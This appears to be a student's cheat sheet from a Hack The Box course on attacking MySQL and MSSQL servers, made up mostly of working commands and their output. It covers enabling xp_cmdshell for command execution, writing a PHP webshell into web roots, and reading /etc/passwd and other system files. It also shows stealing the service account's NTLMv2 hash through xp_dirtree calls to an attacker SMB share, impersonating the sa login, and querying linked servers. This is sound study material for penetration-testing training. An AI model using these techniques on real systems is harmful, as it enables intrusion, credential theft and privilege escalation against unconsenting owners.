- Cheat sheets
    
    [https://academy.hackthebox.com/course/preview/sql-injection-fundamentals](https://academy.hackthebox.com/course/preview/sql-injection-fundamentals)
    
- SQL and MSSQL Defaults Databases
    
    ![image.png](attachment:f3b2bee9-b918-41c1-974f-84d692eb3e70:image.png)
    
- Installing sqlcmd
    
    [https://learn.microsoft.com/en-us/sql/tools/sqlcmd/sqlcmd-utility?view=sql-server-ver16&tabs=go%2Clinux%2Cwindows-support&pivots=cs1-bash#download-and-install-go-sqlcmd](https://learn.microsoft.com/en-us/sql/tools/sqlcmd/sqlcmd-utility?view=sql-server-ver16&tabs=go%2Clinux%2Cwindows-support&pivots=cs1-bash#download-and-install-go-sqlcmd)
    

# Enumerating SQL Databases

## Banner Grabbing

```bash
nmap -Pn -sV -sC -p1433 10.10.10.125
```

---

# SQL & MSSQL Authentication

## MySQL - Connecting to an SQL Server on Linux

```bash
mysql -u julio -pPassword123 -h 10.129.20.13
```

## Sqsh - Connecting to the MSSQL Server (On Linux)

```bash
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```

## [Mssqlclient.py](http://Mssqlclient.py) - Connecting to MSSQL Server (On Linux)

```bash
mssqlclient.py -p 1433 julio@10.129.203.7 
```

## Sqsh - Connecting to the MSSQL Server with Windows Authentication (On Linux)

```bash
# For Windows Authentication
# Use SERVERNAME\\\\accountname or .\\\\accountname. 

sqsh -S 10.129.203.7 -U .\\\\julio -P 'MyPassword!' -h
```

## Sqlcmd - Connecting to the MSSQL Server (On Windows)

- If we use sqlcmd we need to use GO after our query to execute the SQL syntax

```bash
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
Go
```

## SQLCMD - Connecting to the MSSQL Server (On Windows Terminal)

```bash
SQLCMD.EXE -S Hostname
```

---

# Execute Commands on MSSQL

## XP_CMDSHELL - Using Sqlcmd

```bash
1> xp_cmdshell 'whoami'
2> GO

output
-----------------------------
no service\\mssql$sqlexpress
NULL
(2 rows affected)
```

## Enable XP_CMDSHELL - Using Sqlcmd

- appropriate privileges, using the following command

```bash
## To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

## To update the currently configured value for advanced options.  
RECONFIGURE
GO  

## To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

## To update the currently configured value for this feature.  
RECONFIGURE
GO
```

## Other methods of getting Command Execution

There are other methods to get command execution, such as adding extended stored procedures, CLR Assemblies, SQL Server Agent Jobs, and external scripts. However, besides those methods there are also additional functionalities that can be used like the xp_regwrite command that is used to elevate privileges by creating new entries in the Windows registry. Nevertheless, those methods are outside the scope of this module.

---

# Write Local Files

## Write to MySQL

- With appropriate privileges we can write to the webserver directory
- using SELECT INTO OUTFILE

```bash
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Query OK, 1 row affected (0.001 sec)
```

### Verify the secure_file_priv is disabled

- the secure_file_priv, limits the data import and export operations
- In the below we see that it is disabled

```bash
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```

## Write to MSSQL

To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:

### MSSQL - Enable Ole Automation Procedures

```bash
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

### MSSQL - Create a File

```bash
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\\inetpub\\wwwroot\\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

---

# Read Local Files

## Read Local Files in MSSQL

- MSSQL allows file read on any file in the operating system to which the account has read access. We can use the following SQL query:

```bash
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO

BulkColumn

-----------------------------------------------------------------------------
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to hostnames. Each
# entry should be kept on an individual line. The IP address should

(1 rows affected)
```

## Real Local Files in MySQL

- ySQL installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods:

```bash
mysql> select LOAD_FILE("/etc/passwd");

+--------------------------+
| LOAD_FILE("/etc/passwd")
+--------------------------------------------------+
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

<SNIP>
```

---

# Capture MSSQL Service Hash

- Tools to use have
    - Responder
    - Impacker-smbserver
- We steal the MSSQL service account hash using xp_subdirs or xp_dirtree

## Start responder or impacket-smbserver

```bash
sudo responder -I tun0
```

```bash
sudo impacket-smbserver share ./ -smb2support
```

Replace `share` with your desired share name and `./` with the directory you wish to share.

## In SQLCMD - Execute the following SQL Queries

### XP_DIRTREE Hash Stealing

```bash
1> EXEC master..xp_dirtree '\\\\10.10.110.17\\share\\'
2> GO

subdirectory    depth
--------------- -----------
```

### XP_SUBDIRS Hash Stealing

```bash

1> EXEC master..xp_subdirs '\\\\10.10.110.17\\share\\'
2> GO

HResult 0x55F6, Level 16, State 1
xp_subdirs could not access '\\\\10.10.110.17\\share\\*.*': FindFirstFile() returned error 5, 'Access is denied.'

```

### XP_SUBDIRS Hash Stealing with Responder

```bash
z3tssu@htb[/htb]$ sudo responder -I tun0

                                         __               
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|              
<SNIP>

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : SRVMSSQL\\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:
```

### XP_SUBDIRS Hash Stealing with impacket

```bash
z3tssu@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 
[*] Config file parsed                                                 
[*] Config file parsed                                                 
[*] Config file parsed
[*] Incoming connection (10.129.203.7,49728)
[*] AUTHENTICATE_MESSAGE (WINSRV02\\mssqlsvc,WINSRV02)
[*] User WINSRV02\\mssqlsvc authenticated successfully                        
[*] demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
[*] Closing down connection (10.129.203.7,49728)                      
[*] Remaining connections []
```

---

# Impersonate Existing Users with MSSQL

## Identify Users that We Can Impersonate

```bash
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin

(3 rows affected)
```

## Verifying our Current User and Role

- sysadmins can impersonate anyone

```bash
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio                                                                                                                    

(1 rows affected)

-----------
          0

(1 rows affected)
```

## Impersonating the SA User

```bash
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1

(1 rows affected)
```

> Note: It's recommended to run EXECUTE AS LOGIN within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using USE master.

We can now execute any command as a sysadmin as the returned value 1 indicates. To revert the operation and return to our previous user, we can use the Transact-SQL statement REVERT.

---

# Communicate with Other Databases with MSSQL

## Identify linked Servers in MSSQL

```bash
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\\SQLEXPRESS          1
10.0.0.12\\SQLEXPRESS                0

(2 rows affected)
```

isremote = where 1 means is a remote server, and 0 is a linked server.

```bash
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

(1 rows affected)
```

[10.0.0.12\SQLEXPRESS] = Linked Server

---

[**SQL HTB LAB -**](https://www.notion.so/SQL-HTB-LAB-1f4c8126a79b8097a696fac1825b24b1?pvs=21)

[Latest SQL Vulnerabilities](https://www.notion.so/Latest-SQL-Vulnerabilities-1f7c8126a79b806a98aaf8f25f92448a?pvs=21)